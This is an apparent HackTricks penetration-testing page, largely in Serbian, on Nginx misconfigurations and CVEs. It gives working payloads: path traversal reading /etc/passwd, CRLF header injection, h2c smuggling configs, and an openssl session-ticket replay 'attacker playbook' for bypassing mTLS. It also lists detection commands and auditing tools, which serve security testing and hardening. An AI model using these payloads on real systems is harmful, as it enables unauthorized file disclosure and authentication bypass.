# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Nedostajuća root lokacija <a href="#missing-root-location" id="missing-root-location"></a>

Pri konfigurisanju Nginx servera, **root directive** ima ključnu ulogu jer definiše osnovni direktorijum iz kojeg se poslužuju fajlovi. Pogledajte primer ispod:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
U ovoj konfiguraciji, `/etc/nginx` je označen kao root direktorijum. Ova postavka omogućava pristup fajlovima unutar navedenog root direktorijuma, kao što je `/hello.txt`. Ipak, važno je napomenuti da je definisana samo specifična lokacija (`/hello.txt`). Ne postoji konfiguracija za root lokaciju (`location / {...}`). Ovaj propust znači da root direktiva važi globalno, omogućavajući zahtevima za root putanju `/` pristup fajlovima u okviru `/etc/nginx`.

Iz ove konfiguracije proističe ozbiljan bezbednosni problem. Jednostavan `GET` zahtev, kao `GET /nginx.conf`, može otkriti osetljive informacije tako što će poslužiti Nginx konfiguracioni fajl koji se nalazi na `/etc/nginx/nginx.conf`. Podesiti root na manje osetljiv direktorijum, poput `/etc`, može ublažiti ovaj rizik, ali i dalje može dozvoliti nenameran pristup drugim kritičnim fajlovima, uključujući druge konfiguracione fajlove, access logs, pa čak i šifrovane kredencijale koji se koriste za HTTP basic authentication.

## Alias LFI Misconfiguration <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

U konfiguracionim fajlovima Nginx-a treba pažljivo proveriti "location" directives. Ranljivost poznata kao Local File Inclusion (LFI) može biti nenamerno uvedena kroz konfiguraciju koja podseća na sledeću:
```
location /imgs {
alias /path/images/;
}
```
Ova konfiguracija je podložna LFI napadima zbog toga što server interpretira zahteve poput `/imgs../flag.txt` kao pokušaj pristupa fajlovima izvan predviđenog direktorijuma, što efektivno dovodi do `/path/images/../flag.txt`. Ovaj propust omogućava napadačima da preuzmu fajlove iz datotečnog sistema servera koji ne bi trebalo da budu dostupni preko web-a.

Da bi se otklonila ova ranjivost, konfiguracija treba da se izmeni tako da:
```
location /imgs/ {
alias /path/images/;
}
```
Više informacija: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Accunetix testovi:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Nesigurno ograničavanje putanja <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Pogledajte sledeću stranicu da naučite kako zaobići direktive kao što su:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Neosigurana upotreba promenljivih / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Ranljive promenljive `$uri` i `$document_ur`i — ovo se može popraviti zamenom sa `$request_uri`.
>
> Regex može takođe biti ranjiv, na primer:
>
> `location ~ /docs/([^/])? { … $1 … }` - Ranjiv
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Nije ranjiv (provera razmaka)
>
> `location ~ /docs/(.*)? { … $1 … }` - Nije ranjiv

Ranljivost u Nginx konfiguraciji prikazana je u sledećem primeru:
```
location / {
return 302 https://example.com$uri;
}
```
Karakteri \r (Carriage Return) i \n (Line Feed) označavaju znakove novog reda u HTTP zahtevima, a njihove URL-encoded forme predstavljene su kao `%0d%0a`. Uključivanje ovih karaktera u zahtev (npr. `http://localhost/%0d%0aDetectify:%20clrf`) ka pogrešno konfiguranom serveru dovodi do toga da server izda novi header nazvan `Detectify`. Do toga dolazi zato što promenljiva $uri dekodira URL-encoded znakove novog reda, što rezultuje neočekivanim headerom u odgovoru:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
Saznajte više o rizicima CRLF injection i response splitting na [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Takođe, ova tehnika je [**explained in this talk**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) sa nekoliko ranjivih primera i mehanizmima detekcije. Na primer, da biste otkrili ovu pogrešnu konfiguraciju iz blackbox perspektive mogli biste poslati sledeće zahteve:

- `https://example.com/%20X` - Bilo koji HTTP kod
- `https://example.com/%20H` - 400 Bad Request

Ako je ranjiv, prvi će vratiti uspeh jer je "X" bilo koja HTTP metoda, a drugi će vratiti grešku jer H nije validna metoda. Dakle, server će primiti nešto poput: `GET / H HTTP/1.1` i to će izazvati grešku.

Drugi primeri detekcije su:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Bilo koji HTTP kod
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Neke pronađene ranjive konfiguracije predstavljene u tom predavanju su:

- Obratite pažnju da je **`$uri`** postavljen neizmenjen u finalnom URL-u
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Primetite kako je opet **`$uri`** u URL-u (ovaj put unutar parametra)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Sada u AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Bilo koja varijabla

Otkriveno je da se **podatci koje dostavi korisnik** u određenim okolnostima mogu tretirati kao **Nginx variable**. Uzrok ovog ponašanja ostaje donekle neuhvatljiv, ali nije redak i nije jednostavno ga verifikovati. Ova anomalija je istaknuta u izveštaju o bezbednosti na HackerOne, koji je dostupan [here](https://hackerone.com/reports/370094). Daljom analizom poruke o grešci utvrđeno je da se javlja u [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), ukazujući da su Server Side Includes (SSI) osnovni uzrok.

Da biste **otkrili ovu pogrešnu konfiguraciju**, može se izvršiti sledeća komanda, koja podrazumeva postavljanje referer header-a kako bi se testiralo ispisivanje promenljive:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Skeniranja ove pogrešne konfiguracije na sistemima otkrila su više slučajeva gde korisnik može da ispise Nginx promenljive. Međutim, smanjenje broja ranjivih instanci sugeriše da su napori da se ovaj problem ispravi donekle uspešni.

### Korišćenje try_files sa $URI$ARGS promenljivama

Sledeća pogrešna konfiguracija Nginx-a može dovesti do LFI ranjivosti:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
U našoj konfiguraciji imamo direktivu `try_files` koja se koristi za proveru postojanja fajlova u zadatom redosledu. Nginx će poslužiti prvi koji pronađe. Osnovna sintaksa direktive `try_files` je sledeća:
```
try_files file1 file2 ... fileN fallback;
```
Nginx će proveriti postojanje svake datoteke u navedenom redosledu. Ako datoteka postoji, biće odmah poslužena. Ako nijedna od navedenih datoteka ne postoji, zahtev će biti prosleđen fallback opciji, koja može biti drugi URI ili određena stranica greške.

Međutim, kada se u ovoj direktivi koriste promenljive $uri$args, Nginx će pokušati da pronađe datoteku koja odgovara request URI-u kombinovanom sa bilo kojim query string argumentima. Zato možemo iskoristiti ovu konfiguraciju:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Sa sledećim payload-om:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Koristeći naš payload pobegnućemo iz root direktorijuma (definisanog u Nginx konfiguraciji) i učitati fajl `/etc/passwd`. U debug logovima možemo videti kako Nginx pokušava fajlove:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC protiv Nginx-a koristeći prethodno pomenutu konfiguraciju:
![Example burp request](../../images/nginx_try_files.png)

## Čitanje neobrađenog backend odgovora

Nginx nudi mogućnost preko `proxy_pass` koja omogućava presretanje grešaka i HTTP header-a koje generiše backend, sa ciljem da sakrije interne poruke o greškama i header-e. Ovo se postiže tako što Nginx servisira prilagođene error stranice kao odgovor na greške iz backenda. Međutim, problem nastaje kada Nginx primi nevažeći HTTP zahtev. Takav zahtev se prosleđuje backendu onako kako je primljen, i raw odgovor backenda se potom direktno šalje klijentu bez intervencije Nginx-a.

Razmotrimo primer koji uključuje uWSGI aplikaciju:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Za upravljanje ovim koriste se specifične direktive u Nginx konfiguraciji:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Ova direktiva omogućava Nginx-u da posluži prilagođeni odgovor za backend odgovore sa statusnim kodom većim od 300. Ona osigurava da, za naš primer uWSGI aplikacije, `500 Error` odgovor bude presretnut i obrađen od strane Nginx-a.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Kao što ime sugeriše, ova direktiva skriva određena HTTP zaglavlja od klijenta, povećavajući privatnost i bezbednost.

Kada se izvrši validan `GET` zahtev, Nginx ga obrađuje normalno, vraćajući standardni error odgovor bez otkrivanja bilo kojih tajnih zaglavlja. Međutim, nevažeći HTTP zahtev zaobilazi ovaj mehanizam, što dovodi do izlaganja sirovih backend odgovora, uključujući tajna zaglavlja i poruke o grešci.

## merge_slashes set to off

By default, Nginx's **`merge_slashes` directive** is set to **`on`**, which compresses multiple forward slashes in a URL into a single slash. This feature, while streamlining URL processing, can inadvertently conceal vulnerabilities in applications behind Nginx, particularly those prone to local file inclusion (LFI) attacks. Security experts **Danny Robinson and Rotem Bar** have highlighted the potential risks associated with this default behavior, especially when Nginx acts as a reverse-proxy.

To mitigate such risks, it is recommended to **turn the `merge_slashes` directive off** for applications susceptible to these vulnerabilities. This ensures that Nginx forwards requests to the application without altering the URL structure, thereby not masking any underlying security issues.

For more information check [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maliciozna zaglavlja odgovora**

As shown in [**this writeup**](https://mizu.re/post/cors-playground), there are certain headers that if present in the response from the web server they will change the behaviour of the Nginx proxy. You can check them [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):

- `X-Accel-Redirect`: Ukazuje Nginx-u da interno preusmeri zahtev na određenu lokaciju.
- `X-Accel-Buffering`: Kontroliše da li Nginx treba da buferuje odgovor ili ne.
- `X-Accel-Charset`: Postavlja karakter set za odgovor pri korišćenju X-Accel-Redirect.
- `X-Accel-Expires`: Postavlja vreme isteka odgovora pri korišćenju X-Accel-Redirect.
- `X-Accel-Limit-Rate`: Ograničava brzinu prenosa za odgovore pri korišćenju X-Accel-Redirect.

For example, the header **`X-Accel-Redirect`** will cause an internal **redirect** in the nginx. So having an nginx configuration with something such as **`root /`** and a response from the web server with **`X-Accel-Redirect: .env`** will make nginx sends the content of **`/.env`** (Path Traversal).

### **Default Value in Map Directive**

In the **Nginx configuration**, the `map` directive often plays a role in **authorization control**. A common mistake is not specifying a **default** value, which could lead to unauthorized access. For instance:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Bez `default`, **maliciozni korisnik** može zaobići bezbednost pristupanjem **nedefinisanom URI-ju** unutar `/map-poc`. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) savetuje postavljanje **podrazumevane vrednosti** kako bi se izbegli takvi problemi.

### **Ranljivost DNS spoofing-a**

DNS spoofing protiv Nginx-a je moguć pod određenim uslovima. Ako napadač zna **DNS server** koji Nginx koristi i može presretati njegove DNS upite, može spoofovati DNS records. Ova metoda, međutim, nije efikasna ako je Nginx konfigurisan da koristi **localhost (127.0.0.1)** za DNS rezoluciju. Nginx dozvoljava specificiranje DNS servera na sledeći način:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` i `internal` Direktive**

Direktiva **`proxy_pass`** se koristi za prosleđivanje zahteva ka drugim serverima, bilo interno ili eksterno. Direktiva **`internal`** obezbeđuje da su određene lokacije dostupne samo unutar Nginx-a. Iako same ove direktive nisu ranjivosti, njihova konfiguracija zahteva pažljivu proveru kako bi se sprečili bezbednosni propusti.

## proxy_set_header Upgrade & Connection

Ako je nginx server konfigurisan da prosleđuje Upgrade i Connection headers, može se izvesti [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) kako bi se pristupilo zaštićenim/internim endpoint-ima.

> [!CAUTION]
> Ova ranjivost bi napadaču omogućila da **uspostavi direktnu vezu sa `proxy_pass` endpoint-om** (`http://backend:9999` u ovom slučaju), čiji sadržaj nginx neće proveravati.

Example of vulnerable configuration to steal `/flag` from [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Imajte na umu da čak i ako je `proxy_pass` upućivao na određenu **putanju** poput `http://backend:9999/socket.io` konekcija će biti uspostavljena sa `http://backend:9999` pa možete **kontaktirati bilo koju drugu putanju unutar tog internog endpointa. Dakle, nije važno ako je putanja navedena u URL-u `proxy_pass`.**

## HTTP/3 QUIC module remote DoS & leak (2024)

Tokom 2024. Nginx je objavio CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 и CVE-2024-35200, pokazujući da jedna **pojedinačna zlonamerna QUIC session** može srušiti worker procese ili leak memoriju kad god je eksperimentalni `ngx_http_v3_module` kompajliran i izložen je `listen ... quic` socket. Pogođene verzije su 1.25.0–1.25.5 i 1.26.0, dok 1.27.0/1.26.1 sadrže ispravke; otkrivanje memorije (CVE-2024-34161) dodatno zahteva MTU-ove veće od 4096 bajtova da bi se osetljivi podaci pojavili (detalji u 2024 nginx advisory navedenom dole).

**Recon & exploitation hints**

- HTTP/3 je opt-in, pa skenirajte za `Alt-Svc: h3=":443"` odgovore ili izvršite brute-force UDP/443 QUIC handshakes; jednom potvrđeno, fuzz-ujte handshake i STREAM frames sa prilagođenim `quiche-client`/`nghttp3` payload-ovima da izazovete rušenje worker procesa i prouzrokujete log leak.
- Quickly fingerprint target support with:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## Zaobilaženje ponovnog uspostavljanja TLS sesije pri autentifikaciji klijentskih sertifikata (CVE-2025-23419)

U februaru 2025. advisory je otkrilo da nginx 1.11.4–1.27.3 kompajliran sa OpenSSL dozvoljava **reusing a TLS 1.3 session** iz jednog name-based virtual host-a unutar drugog, tako da klijent koji je pregovarao host bez sertifikata može replay-ovati ticket/PSK da se ubaci u vhost zaštićen sa `ssl_verify_client on;` i potpuno zaobiđe mTLS. Bag se aktivira kad god više virtual host-ova dele isti TLS 1.3 session cache i tickets (pogledati 2025 nginx advisory referenciran ispod).

**Playbook napadača**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Ako je cilj ranjiv, drugi handshake se završava bez predstavljanja client certificate, otkrivajući zaštićene lokacije.

**Šta treba proveriti**

- Mešoviti `server_name` blokovi koji dele `ssl_session_cache shared:SSL` plus `ssl_session_tickets on;`.
- Admin/API blokovi koji očekuju mTLS, ali nasleđuju shared session cache/ticket settings iz javnih hostova.
- Automatizacija koja omogućava TLS 1.3 session resumption globalno (npr. Ansible roles) bez razmatranja izolacije vhost-a.

## HTTP/2 Rapid Reset otpornost (ponašanje CVE-2023-44487)

The HTTP/2 Rapid Reset attack (CVE-2023-44487) i dalje utiče na nginx kada operatori povise `keepalive_requests` ili `http2_max_concurrent_streams` iznad podrazumevanih vrednosti: napadač otvori jednu HTTP/2 connection, zatrpa je hiljadama streams, zatim odmah šalje `RST_STREAM` frames tako da concurrency ceiling nikada nije dostignut dok CPU nastavlja da troši resurse na tear-down logic. Nginx podrazumevane vrednosti (128 concurrent streams, 1000 keepalive requests) drže blast radius malim; podizanje tih limita "substantially higher" čini trivijalnim da se workers ostave bez resursa čak i od jednog klijenta (vidi F5 write-up referenciran ispod).

**Saveti za otkrivanje**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Domaćini koji otkrivaju neuobičajeno visoke vrednosti tih direktiva su primarne mete: jedan HTTP/2 client može u petlji kreirati streamove i slati instant `RST_STREAM` frejmove kako bi držao CPU na maksimumu bez aktiviranja ograničenja konkurentnosti.

## Isprobajte sami

Detectify je napravio GitHub repozitorijum gde možete pomoću Docker-a postaviti sopstveni ranjivi Nginx test server sa nekim od pogrešnih konfiguracija obrađenih u ovom članku i pokušati da ih sami pronađete!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Alati za statičku analizu

### [gixy-ng](https://github.com/dvershinin/gixy) & [GixyNG](https://github.com/megamansec/gixyng) & [GIXY](https://github.com/yandex/gixy)


- [GixyNG](https://github.com/megamansec/gixyng) (ažurirani fork GIXY) je alat za analizu Nginx konfiguracija, sa ciljem pronalaženja ranjivosti, nesigurnih direktiva i rizičnih pogrešnih konfiguracija. Takođe pronalazi pogrešne konfiguracije koje utiču na performanse i detektuje propuštene mogućnosti za hardening, omogućavajući automatsko otkrivanje propusta.
- [gixy-ng](https://github.com/dvershinin/gixy) (aktivno održavani fork GIXY) je alat za analizu Nginx konfiguracija, sa ciljem pronalaženja ranjivosti, nesigurnih direktiva i rizičnih pogrešnih konfiguracija. Takođe pronalazi pogrešne konfiguracije koje utiču na performanse i detektuje propuštene mogućnosti za hardening, omogućavajući automatsko otkrivanje propusta.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner je jednostavan alat za traženje uobičajenih Nginx pogrešnih konfiguracija i ranjivosti.

## Reference

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
